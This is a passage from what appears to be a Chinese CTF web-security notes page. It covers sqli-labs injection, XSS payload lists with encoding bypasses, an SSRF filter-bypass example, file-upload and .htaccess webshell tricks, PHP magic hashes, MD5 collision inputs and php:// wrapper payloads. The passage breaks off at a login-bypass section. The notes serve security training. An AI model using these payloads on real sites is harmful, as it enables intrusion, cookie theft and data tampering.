class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1%27;<span class="keyword">insert</span>%<span class="number">20</span><span class="keyword">into</span>%<span class="number">20</span><span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>)%<span class="number">20</span><span class="keyword">values</span>%<span class="number">20</span>(%<span class="number">2738</span>%<span class="number">27</span>,%<span class="number">27</span>less38%<span class="number">27</span>,%<span class="number">27</span>hello%<span class="number">27</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><h5 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h5><p>同 38，只是没有 <code>‘’</code>。</p><h5 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h5><h5 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h5><h5 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h5><h5 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h5><h5 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h5><h5 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h5><h5 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h5><h5 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h5><h5 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h5><h5 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h5><h5 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h5><h5 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h5><h5 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h5><h5 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h5><h5 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h5><h5 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h5><h5 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h5><h5 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h5><h5 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h5><h5 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h5><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>类型：</p><ul><li>简单存储型 xss 盲打管理员后台</li><li>各种浏览器 auditor 绕过</li><li>富文本过滤黑白名单绕过</li><li>CSP 绕过</li><li>Flash xss</li><li>AngularJS 客户端模板 xss</li></ul><p>工具：</p><ul><li><p>hackbar</p></li><li><p>xss 平台</p></li><li>swf decompiler</li><li>flasm</li><li>doswf(swf加密)</li><li>Crypt Flow(swf加密)</li></ul><p>思路：</p><ul><li>简单的xss，未作任何过滤，直接利用xss平台盲打管理员cookie</li><li>过滤标签，尝试各种绕过方法</li><li>存在安全策略csp等，尝试相应的绕过方法</li><li>逆向 .swf 文件，审计源码，构造 xss payload</li></ul><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>同源策略</strong></p><p>何为同源？</p><ul><li>协议相同（http/https）</li><li>host 相同</li><li>端口相同</li></ul><h4 id="常见标签"><a href="#常见标签" class="headerlink" title="常见标签"></a>常见标签</h4><p><strong><code>&lt;img&gt;</code></strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(<span class="string">"xss"</span>)&gt;</span><br><span class="line">&lt;IMG SRC=javascript:alert(<span class="built_in">String</span>.formCharCode(<span class="number">88</span>, <span class="number">83</span>, <span class="number">83</span>))&gt;</span><br><span class="line">&lt;img src=<span class="string">"URL"</span> style=<span class="string">'Xss:expression(alert(/xss));'</span>&gt;</span><br><span class="line">&lt;!--CSS标记xss--&gt;</span><br><span class="line">&lt;img style=<span class="string">"background-image:url(javascript:alert('XSS'))"</span>&gt;</span><br><span class="line">    </span><br><span class="line">&lt;img src=<span class="string">"x"</span> onerror=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;img src=<span class="string">"1"</span> onerror=<span class="built_in">eval</span>(<span class="string">"alert('xss')"</span>)&gt;</span><br><span class="line">    </span><br><span class="line">&lt;img src=<span class="number">1</span> onmouseover=alert(<span class="string">'xss'</span>)&gt;</span><br></pre></td></tr></table></figure><p><strong><code>&lt;a&gt;</code></strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"https://www.baidu.com"</span>&gt;baidu&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;a href="javascript:alert('xss')"&gt;aa&lt;/</span>a&gt;</span><br><span class="line">&lt;a href=javascript:<span class="built_in">eval</span>(alert(<span class="string">'xss'</span>))&gt;aa&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">&lt;a href="javascript:aaa" onmouseover="alert(/</span>xss/)<span class="string">"&gt;aa&lt;/a&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script&gt;alert('xss')&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;a href="</span><span class="string">" onclick=alert('xss')&gt;aa&lt;/a&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;a href="</span><span class="string">" onclick=eval(alert('xss'))&gt;aa&lt;/a&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;a href=kycg.asp&gt;ttt=1000 onmouseover=prompt('xss') y=2018&gt;aaa&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p><strong><code>input</code></strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">"name"</span> value=<span class="string">""</span>&gt;</span><br><span class="line">    </span><br><span class="line">&lt;input value=<span class="string">""</span> onclick=alert(<span class="string">'xss'</span>) type=<span class="string">"text"</span>&gt;</span><br><span class="line">    </span><br><span class="line">&lt;input name=<span class="string">"name"</span> value=<span class="string">""</span> onmouseover=prompt(<span class="string">'xss'</span>) bad=<span class="string">""</span>&gt;</span><br><span class="line">    </span><br><span class="line">&lt;input name=<span class="string">"name"</span> value=<span class="string">""</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'xss'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong><code>form</code></strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=javascript:alert(<span class="string">'xss'</span>) method=<span class="string">"get"</span>&gt;</span><br><span class="line">&lt;form action=javascript:alert(<span class="string">'xss'</span>)&gt;</span><br><span class="line">    </span><br><span class="line">&lt;form method=post action=aa.asp? onmouseover=prompt(<span class="string">'xss'</span>)&gt;</span><br><span class="line">&lt;form method=post action=aa.asp? onmouseover=alert(<span class="string">'xss'</span>)&gt;</span><br><span class="line">&lt;form action=<span class="number">1</span> onmouseover=alert(<span class="string">'xss'</span>)&gt;</span><br><span class="line">    </span><br><span class="line">&lt;!--原code--&gt;</span><br><span class="line">&lt;form method=post action=<span class="string">"data:text/html;base64,&lt;script&gt;alert('xss')&lt;/script&gt;"</span>&gt;</span><br><span class="line">&lt;!--base64编码--&gt;</span><br><span class="line">&lt;form method=post action=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="</span>&gt;</span><br></pre></td></tr></table></figure><p><strong><code>&lt;iframe&gt;</code></strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=javascript:alert(<span class="string">'xss'</span>);height=<span class="number">5</span>width=<span class="number">1000</span> /&gt;<span class="xml"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--原code--&gt;</span></span></span><br><span class="line">&lt;iframe src="data:text/html;base64,&lt;script&gt;alert('xss')&lt;/script&gt;"&gt;</span><br><span class="line">&lt;!--base64编码--&gt;</span><br><span class="line">&lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="&gt;</span><br><span class="line">    </span><br><span class="line">&lt;iframe src="aaa" onmouseover=alert('xss') /&gt;&lt;iframe&gt;</span><br><span class="line">    </span><br><span class="line">&lt;iframe src="javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;"&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><strong><code>&lt;svg&gt;</code></strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p><strong>JS编码**</strong></p><p>JS提供了四种字符编码的策略，</p><ul><li>三个八进制数字，如果数字不够，在前面补零，如<code>a</code>的编码为<code>\141</code></li><li>两个十六进制数字，如果数字不够，在前面补零，如<code>a</code>的编码为<code>\x61</code></li><li>四个十六进制数字，如果数字不够，在前面补零，如<code>a</code>的编码为<code>\u0061</code></li><li>对于一些控制字符，使用特殊的C类型的转义风格，如<code>\n</code>和<code>\r</code></li></ul><p><strong>HTML实体编码</strong></p><p>以<code>&amp;</code>开头，以分号结尾的，即HTML编码，如<code>&lt;</code>的编码为<code>&amp;1t;</code></p><p>十进制，十六进制的ASCII码或者Unicode字符编码。样式为<code>&amp;#数值;</code></p><p>如<code>&lt;</code>的编码为<code>&amp;#60;</code> (10进制)<code>&amp;#x003c;</code> (16进制)</p><p><strong>URL编码</strong></p><p>这里为url全编码，也就是两次url编码</p><p>如<code>alert</code>的url全编码为<code>%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34</code></p><p><strong>String.fromCharCode编码</strong></p><p>如<code>alert</code>的编码为<code>String.fromCharCode(97,108,101,114,116)</code></p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>工具：</p><ul><li>rips</li><li>seay</li><li>githack</li><li>stings, grep</li></ul><p>思路：</p><ul><li>根据提示，猜测是否需要审计源代码</li><li>直接找到源代码，或者利用各种找源码的技巧找源码，或利用漏洞查看源码文件</li><li>人工审计代码，结合题目，找到存在注入的地方，或编写相应脚本等等</li><li>检索关键函数，admin(), check(), upload()</li><li>检索关键的文件，config.php, check.lib.php, xxx.class.php</li></ul><h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><p><a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51" target="_blank" rel="noopener">原链接</a> <a href="http://n3k0sec.top/2018/06/24/PHP-SSRF%E7%BB%95%E8%BF%87tricks/" target="_blank" rel="noopener">改编</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Argument: "</span>.$argv[<span class="number">1</span>].<span class="string">"\n"</span>;</span><br><span class="line">   <span class="comment">// check if argument is a valid URL</span></span><br><span class="line">   <span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      <span class="comment">// parse URL</span></span><br><span class="line">      $r = parse_url($argv[<span class="number">1</span>]);</span><br><span class="line">      print_r($r);</span><br><span class="line">      <span class="comment">// check if host ends with google.com</span></span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">'/google\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">         <span class="comment">// get page from URL</span></span><br><span class="line">         exec(<span class="string">'curl -v -s "'</span>.$r[<span class="string">'host'</span>].<span class="string">'"'</span>, $a);</span><br><span class="line">         print_r($a);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"Error: Host not allowed"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Error: Invalid URL"</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h3><p><a href="https://github.com/c0ny1/upload-labs.git" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs.git</a></p><ul><li>Apache 解析</li></ul><p><code>phpshell.php.rar.rar.rar.rar</code> 因为 Apache 不认识 <code>.rar</code> 这个文件类型，所以会一直遍历后缀到 <code>.php</code>，然后认为这是一个 PHP 文件。</p><ul><li>IIS 解析</li></ul><p>IIS 6 下当文件名为 <code>abc.asp;xx.jpg</code> 时，会将其解析为 <code>abc.asp</code>。</p><ul><li>PHP CGI 路径解析</li></ul><p>当访问 <code>http://www.a.com/path/test.jpg/notexist.php</code> 时，会将 <code>test.jpg</code> 当做 PHP 解析， <code>notexist.php</code> 是不存在的文件。此时 Nginx 的配置如下</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">  <span class="attribute">root</span> html;</span><br><span class="line">  <span class="attribute">fastcgi_pass</span> <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">  <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">  <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME /scripts<span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">  <span class="attribute">include</span> fastcgi_param;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>基于前端 JS 的验证</p><p>firebug 修改一下 JS 文件</p></li><li><p>基于文件后缀名的绕过</p><p>后缀名大小写混用</p><p>空格，加点，加下划线，双重后缀名，叠用 phphpp</p><p>PHP345，.inc, .phtml, .phpt, .phps</p><p>%00截断：name=test.jpg0x00</p><p>​           1.php%00.png</p><p>​           1.aspchr(0)&amp;XXX.jpg,chr(0)</p><p>​            /1.php，在1.php前加个空格，在hex中找到20再改为00</p><p>.htaccess(文件重写)：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch "95zz.gif"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>基于文件类型的检测</p><p>Content-Type : Multipart/form-data; 大小写绕过</p></li><li><p>在线编辑器漏洞</p></li><li><p>文件包含</p></li><li><p>基于文件头部信息的过滤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy xx.png+xxx.php out.jpg  # win下的命令</span><br><span class="line"><span class="meta">#</span><span class="bash"> 再修改下后缀名</span></span><br></pre></td></tr></table></figure></li></ul><p>思路：</p><ul><li><p>简单的上传文件，查看响应</p></li><li><p>是否只是前端过滤后缀名、文件格式，抓包绕过</p></li><li><p>是否存在截断上传漏洞</p></li><li><p>是否对文件头检测(图片马等等)</p></li><li><p>是否对内容进行了检测</p></li><li><p>是否上传吗被查杀，免杀</p></li><li><p>是否存在各种解析漏洞</p></li><li><p>http头以两个 CRLF(相当于\r\n\r\n作为结尾)，当 \r\n 没有被过滤时，</p><p>可以利用 \r\n\r\n 作为 url 参数的截断，后面跟上注入代码</p></li></ul><h2 id="PHP-特性"><a href="#PHP-特性" class="headerlink" title="PHP 特性"></a>PHP 特性</h2><p><strong>类型：</strong></p><ul><li>弱类型</li><li>intval</li><li>strpos 和 ===</li><li>反序列化 + destruct</li><li>\0 截断</li><li>iconv 截断</li><li>parse_str()</li><li>伪协议</li></ul><p>在线调试环境：<a href="http://www.shucunwang.com/RunCode/php" target="_blank" rel="noopener">http://www.shucunwang.com/RunCode/php</a></p><p><strong>思路：</strong></p><ul><li><p>判断是否存在 PHP 中截断特性</p></li><li><p>查看源码，判断是否存在 PHP 弱类型问题</p></li><li><p>查看源码，注意一些特殊函数，eval(), system(), intval()</p></li><li><p>构造变量，获取flag</p></li><li><p>是否存在 HPP</p></li><li><p>魔法哈希 0e开头，sha1(), md5()无法处理数组</p><p>如果要找出 <code>0e</code> 开头的 hash 碰撞，可以用如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">$salt = <span class="string">'vunp'</span>;</span><br><span class="line">$hash = <span class="string">'0e612198634316944013585621061115'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;<span class="number">100000000000</span>; $i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (md5($salt . $i) == $hash) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">'done'</span>;</span><br></pre></td></tr></table></figure><p>常见的payload:</p><p>==md5==</p><p>​        QNKCDZO</p><p>​        0e830400451993494058024219903391</p><p>​        s155964671a</p><p>​        0e342768416822451524974117254469</p><p>​        s214587387a</p><p>​        0e848240448830537924465865611904</p><p>​        s878926199a</p><p>​        0e545993274517709034328855841020</p><p>​        s1091221200a</p><p>​        0e940624217856561557816327384675</p><p>​        s1885207154a</p><p>​        0e509367213418206700842008763514</p><p>​        s1836677006a</p><p>​        0e481036490867661113260034900752</p><p>​        s1184209335a</p><p>​        0e072485820392773389523109082030</p><p>​        s1665632922a</p><p>​        0e731198061491163073197128363787</p><p>​        s1502113478a</p><p>​        0e861580163291561247404381396064</p><p>​        s532378020a</p><p>​        0e220463095855511507588041205815</p><p>==sha1==<br>​    10932435112: 0e07766915004133176347055865026311692244<br>​    aaroZmOk: 0e66507019969427134894567494305185566735<br>​    aaK1STfY: 0e76658526655756207688271159624026011393<br>​    aaO8zKZF: 0e89257456677279068558073954252716165668<br>​    aa3OFF9m: 0e36977786278517984959260394024281014729</p><p>==crc32==</p><p>​    6586: 0e817678</p><p>两个 md5 一样的字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> future.moves.urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">input1 = <span class="string">'Oded Goldreich\nOded Goldreich\nOded Goldreich\nOded Go'</span> + unhexlify(</span><br><span class="line"><span class="string">'d8050d0019bb9318924caa96dce35cb835b349e144e98c50c22cf461244a4064bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf67c12978647f5af123de3acf844085cd025b956'</span>)</span><br><span class="line"></span><br><span class="line">print(quote(input1))</span><br><span class="line"><span class="keyword">print</span> md5(input1).hexdigest()</span><br><span class="line"></span><br><span class="line">input2 = <span class="string">'Neal Koblitz\nNeal Koblitz\nNeal Koblitz\nNeal Koblitz\n'</span> + unhexlify(<span class="string">'75b80e0035f3d2c909af1baddce35cb835b349e144e88c50c22cf461244a40e4bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf6fc11978647f5af123de3acf84408dcd025b956'</span>)</span><br><span class="line"><span class="keyword">print</span> md5(input2).hexdigest()</span><br><span class="line">print(quote(input2))</span><br></pre></td></tr></table></figure><p>另外一组 md5 一样的字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> array <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">input1 = array(<span class="string">'I'</span>, [<span class="number">0x6165300e</span>,<span class="number">0x87a79a55</span>,<span class="number">0xf7c60bd0</span>,<span class="number">0x34febd0b</span>,<span class="number">0x6503cf04</span>,<span class="number">0x854f709e</span>,<span class="number">0xfb0fc034</span>,<span class="number">0x874c9c65</span>,<span class="number">0x2f94cc40</span>,<span class="number">0x15a12deb</span>,<span class="number">0x5c15f4a3</span>,<span class="number">0x490786bb</span>,<span class="number">0x6d658673</span>,<span class="number">0xa4341f7d</span>,<span class="number">0x8fd75920</span>,<span class="number">0xefd18d5a</span>])</span><br><span class="line">input2 = array(<span class="string">'I'</span>, [x^y <span class="keyword">for</span> x,y <span class="keyword">in</span> zip(input1, [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&lt;&lt;<span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&lt;&lt;<span class="number">31</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])])</span><br><span class="line">print(input1 == input2) <span class="comment"># False</span></span><br><span class="line">print(md5(input1).hexdigest()) <span class="comment"># cee9a457e790cf20d4bdaa6d69f01e41</span></span><br><span class="line">print(md5(input2).hexdigest()) <span class="comment"># cee9a457e790cf20d4bdaa6d69f01e41</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>伪协议</strong></p><ul><li><p>php://filter – 对本地磁盘文件进行读写</p><p>查看源码：file=php://filter/read=convert.base64-encode/resource=index.php</p></li><li><p>php://input 伪协议需要服务器支持，同时要求 allow_url_include = on</p><p>fn=php://input，然后再 post 一个 fn=xx</p></li><li><p>php://output 是一个只写的数据流，允许我们以 print 和 echo 一样的方式写入到输出缓冲区</p></li><li><p>php://memory 总是把数据存储在内存中</p></li><li><p>php://temp 会在内存量达到预定义的限制后(默认2M)存入临时文件中</p></li><li><p>data://</p></li></ul><p>DATA伪协议，分号和逗号有争议</p><ul><li>data:,文本数据</li><li>data:text/plain ,文本数据</li><li>data:text/html,HTML代码</li><li>data:text/css;base64,css代码</li><li>data:text/javascript;base64,javascript代码</li><li>data:image/x-icon;base64,base64编码的 icon 图片数据</li><li>data:image/gif;base64,base64编码的gif图片数据</li><li>data:image/png;base64,base64编码的png图片数据</li><li>data:image/jpeg;base64,base64编码的png图片数据</li></ul><p>zip://</p><p>把1.php文件压缩成.zip，再把后缀改成png，上传上去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=zip:<span class="comment">//1.png%231.php</span></span><br><span class="line"><span class="comment">// ?file=zip://1.zip%231.php</span></span><br></pre></td></tr></table></figure><blockquote><p>  glob:// 查找匹配的文件路径模式</p></blockquote><p><strong>文件操作相关</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 列出目录</span></span><br><span class="line">scandir(<span class="string">'/xxx'</span>)  <span class="comment">// . 当前目录 .. 上级目录 / 根目录</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 输出文件内容</span></span><br><span class="line">show_source(<span class="string">'flag.php'</span>);</span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">var_dump(file(<span class="string">'flag.php'</span>));  <span class="comment">// 以下两个以数组形式输出</span></span><br><span class="line">print_r(file(<span class="string">'flag.php'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取文件内容</span></span><br><span class="line">file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">file_get_contents(<span class="string">'http://www.baidu.com'</span>)  <span class="comment">// 读取远程内容，可用作爬虫</span></span><br><span class="line">    </span><br><span class="line">获取当前文件所在目录:</span><br><span class="line"><span class="number">1.</span>print_r(getcwd()); </span><br><span class="line"><span class="number">2.</span>print_r(dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line"></span><br><span class="line">获取当前文件目录(包含本身文件名):</span><br><span class="line">print_r(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">遍历当前目录的文件:</span><br><span class="line"><span class="number">1.</span>print_r(scandir(getcwd())); </span><br><span class="line"><span class="number">2.</span>print_r(scandir(dirname(<span class="keyword">__FILE__</span>))); </span><br><span class="line"><span class="number">3.</span>print_r(glob(<span class="string">"*"</span>))</span><br><span class="line">    </span><br><span class="line">遍历当前目录的前目录的文件:</span><br><span class="line">print_r(scandir(dirname(<span class="keyword">__FILE__</span>) . <span class="string">"/../"</span>));</span><br><span class="line">打开文件:show_source(<span class="string">'flag.php'</span>);</span><br><span class="line">删除文件:unlink(<span class="string">'neko.php'</span>);</span><br><span class="line">是否存在变量:var_dump(getenv(<span class="string">'neko'</span>));</span><br><span class="line">设置变量:putenv(<span class="string">'neko=runa'</span>);</span><br></pre></td></tr></table></figure><h2 id="后台登录类"><a href="#后台登录类" class="headerlink" title="后台登录类"></a>后台登录类</h2><p><strong>类型：</strong></p><ul><li>各种万能密码绕过</li><li>变形的万能密码绕过</li><li>社工的方式得到后台密码</li><li>爆破的方式得到后台密码</li><li>各种 cms 后台登陆绕过</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 